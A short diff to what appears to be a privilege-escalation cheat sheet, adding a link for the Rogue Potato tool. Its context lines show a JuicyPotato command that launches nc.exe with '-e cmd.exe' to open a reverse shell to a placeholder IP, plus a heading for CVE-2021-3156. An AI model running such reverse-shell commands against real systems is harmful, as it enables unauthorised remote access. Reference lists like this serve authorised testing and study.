@@ -4137,6 +4137,12 @@ https://github.com/ohpe/juicy-potato
 C:\> JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <IP address> <port> -e cmd.exe" -t *
 ```
 
+- Rogue Potato
+
+```
+https://github.com/antonioCoco/RoguePotato
+```
+
 - Baron Samedit - CVE-2021-3156
 
 ```
